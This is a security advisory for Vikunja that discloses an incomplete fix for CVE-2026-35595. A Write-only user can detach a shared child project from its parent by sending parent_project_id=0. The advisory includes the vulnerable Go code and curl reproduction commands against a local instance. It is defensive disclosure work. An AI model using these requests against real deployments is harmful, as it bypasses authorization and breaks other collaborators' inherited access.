# [M] Vikunja has an incomplete fix for CVE-2026-35595: Write-only user can detach shared project from parent hierarchy via parent_project_id=0

## Summary
Severity: Medium
Advisory: GHSA-44v6-7fxq-vgf4
CVE: CVE-2026-55064
CWE: CWE-862
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N (CVSS_V3)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-44v6-7fxq-vgf4
Type: github-advisory

## Affected
- Go: `code.vikunja.io/api` — affected >=2.3.0 <2.4.0

## Details
## Summary

The fix for CVE-2026-35595 (project re-parenting privilege escalation) only gates reparent operations when `parent_project_id > 0`. A user with Write (but not Admin) permission on a shared child project can detach it from its parent by sending `parent_project_id: 0`, bypassing the Admin requirement. This severs the recursive CTE permission inheritance chain, potentially disrupting the project hierarchy and affecting inherited access for other collaborators.

## Affected component

- **Package:** go-vikunja/vikunja
- **Affected versions:** v2.3.0 and later (including latest unstable v2.3.0-246-9852aff4). The fix for CVE-2026-35595 was introduced in v2.3.0 but left the detach-to-root case unpatched. Fixed in 2.4.0.
- **Tested on:** Vikunja v2.3.0 (Docker image vikunja/vikunja:2.3.0) AND latest unstable (vikunja/vikunja:unstable, v2.3.0-246-9852aff4 built 2026-04-27)

## Technical detail

### Vulnerable code

**File: `pkg/models/project.go` (lines 1009-1041)**
```go
// GHSA-2vq4-854f-5c72 / CVE-2026-35595: the recursive permission CTE
// cascades Admin from any owned ancestor, so moving a shared child
// under an attacker-owned root grants Admin on the child. Require
// Admin on both sides of a reparent.
//
// Only gate on non-zero ParentProjectID: the generic update handler
// binds a fresh struct, so an omitted parent_project_id is
// indistinguishable from an explicit 0. Detach-to-root is therefore
// out of scope here -- a proper fix needs a pointer field.
if project.ParentProjectID > 0 {
    // ... Admin check (lines 1019-1041) -- SKIPPED when ParentProjectID == 0
}
```

**File: `pkg/models/project_permissions.go` (line 145)**
```go
if p.ParentProjectID != 0 && p.ParentProjectID != ol.ParentProjectID {
    // reparent permission check -- SKIPPED when ParentProjectID == 0
}
```

**File: `pkg/models/project.go` (line 1065)**
```go
colsToUpdate := []string{
    "title", "is_archived", "identifier", "hex_color",
    "parent_project_id",  // <-- ALWAYS included, writes 0 to DB
    "position",
}
```

### Why it's exploitable

1. The generic web handler (`pkg/web/handler/update.go:37`) creates a fresh empty `Project{}` struct -- `ParentProjectID` defaults to Go's zero value (0).
2. When JSON body contains `"parent_project_id": 0`, the struct has `ParentProjectID == 0`.
3. `CanUpdate` at line 145: `ParentProjectID != 0` is false -- reparent check skipped -- falls through to `CanWrite` which succeeds (attacker has Write).
4. `UpdateProject` at line 1018: `ParentProjectID > 0` is false -- Admin gate skipped entirely.
5. xorm writes `parent_project_id = 0` because `"parent_project_id"` is always in `colsToUpdate` with `Cols()`.
6. The project is detached from its parent hierarchy.

### Precondition checklist

- [x] Attacker has authenticated account
- [x] Attacker has Write permission on a child project (via direct share or team membership)
- [x] The target project has a non-zero parent_project_id (it's a child of another project)
- [x] Default Vikunja configuration (no special setup needed)

### Reproduction

**Prerequisites:** Two users (victim = project owner, attacker = Write-only collaborator), a parent project, and a child project shared with the attacker at Write permission.

1. Authenticate as attacker:
```bash
TOKEN=$(curl -s -X POST http://localhost:3456/api/v1/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"user_a","password":"UserAPassword1!"}' | jq -r '.token')
```

2. Verify attacker does NOT have Admin (delete should return 403):
```bash
curl -s -o /dev/null -w '%{http_code}' -X DELETE http://localhost:3456/api/v1/projects/4 \
  -H "Authorization: Bearer $TOKEN"
# Expected: 403
```

3. Exploit -- detach project from parent:
```bash
curl -s -X POST http://localhost:3456/api/v1/projects/4 \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"title":"Sensitive Child Project","parent_project_id":0}'
```

4. Verify detachment:
```bash
curl -s http://localhost:3456/api/v1/projects/4 \
  -H "Authorization: Bearer $TOKEN" | jq '.parent_project_id'
# Returns: 0 (was: 3)
```

### Evidence (3 independent runs)

| Run | parent_project_id BEFORE | DELETE attempt (proves no Admin) | parent_project_id AFTER | Result |
|-----|--------------------------|----------------------------------|-------------------------|--------|
| 1 | 3 (child of project 3) | HTTP 403 Forbidden | null (detached to root) | CONFIRMED |
| 2 | 3 (child of project 3) | HTTP 403 Forbidden | null (detached to root) | CONFIRMED |
| 3 | 3 (child of project 3) | HTTP 403 Forbidden | null (detached to root) | CONFIRMED |

*Note: "null (detached to root)" means `parent_project_id` was set to `0` in the database, making the project a root-level project with no parent.*

## Impact

- **Unauthorized hierarchy modification:** A user with only Write permission can detach a child project from its parent, which should require Admin permission (as established by the CVE-2026-35595 fix for non-zero reparents).
- **Permission inheritance disruption:** The recursive CTE permission model traverses `parent_project_id` upward. Detaching a project severs this chain, potentially causing other collaborators who inherited access through the parent to lose their permissions on the detached project.
- **Organizational disruption:** The project moves from a structured hierarchy to a root-level project, breaking the owner's intended organizational structure.

## Suggested fix

Use a pointer field `*int64` for `ParentProjectID` to distinguish between "field omitted" (nil) and "explicitly set to 0" (detach). The fix commit itself acknowledges this at `project.go:1017`: "a proper fix needs a pointer field."

Alternatively, add a dedicated `detach` boolean field or a separate API endpoint for detaching projects, with its own Admin permission check.

## References
- https://github.com/go-vikunja/vikunja/security/advisories/GHSA-44v6-7fxq-vgf4
- https://github.com/go-vikunja/vikunja
